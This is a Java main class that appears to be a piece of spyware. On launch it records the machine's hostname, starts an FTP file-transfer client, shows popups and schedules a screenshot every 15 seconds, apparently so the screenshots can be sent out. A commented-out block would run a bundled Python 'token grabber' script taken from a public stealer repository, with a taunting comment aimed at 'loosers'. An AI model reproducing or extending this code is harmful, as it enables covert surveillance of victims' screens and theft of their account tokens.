package fr.mimifan.jac;

import fr.mimifan.jac.popups.PopupsManager;
import fr.mimifan.jac.resources.ResourcesManager;
import fr.mimifan.jac.screens.ScreenShotter;
import fr.mimifan.jac.ftp.FileTransferClient;

import java.io.*;
import java.net.InetAddress;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class Main {

    public static String hostname = "";

    public static void main(String[] args) throws IOException, InterruptedException {
        InetAddress localhost = InetAddress.getLocalHost();
        hostname = localhost.getHostName();


        // This gonna be for another time loosers <3
        /*InputStream inputStream = Main.class.getResourceAsStream("/script.py");
        assert inputStream != null;
        InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
        BufferedReader bufferedReader = new BufferedReader(inputStreamReader);

        StringBuilder stringBuilder = new StringBuilder();
        String line;
        while (true) {
            try {if ((line = bufferedReader.readLine()) == null) break; } catch (IOException e) {throw new RuntimeException(e);}
            stringBuilder.append(line).append("\n");
        }

        String pythonScript = stringBuilder.toString();

        // Exécution du script Python
        // SCRIPT TOKEN GRABER https://github.com/venaxyt/Token-Grabber-Advanced/blob/main/Token%20Grabber.py
        URL url = Main.class.getResource("/script.py");
        assert url != null;
        try {
            File scriptFile = new File(url.toURI());
            System.out.println(scriptFile.getAbsolutePath());
            ProcessBuilder processBuilder = new ProcessBuilder("python", scriptFile.getAbsolutePath());
            processBuilder.inheritIO();
            Process process = processBuilder.start();
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }*/

        ResourcesManager.getInstance().loadPopups();
        FileTransferClient.getInstance().load();
        ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
        executor.scheduleAtFixedRate(() -> ScreenShotter.getInstance().takeScreenShot(), 0, 15, TimeUnit.SECONDS);
        PopupsManager.getInstance().load();

    }

}
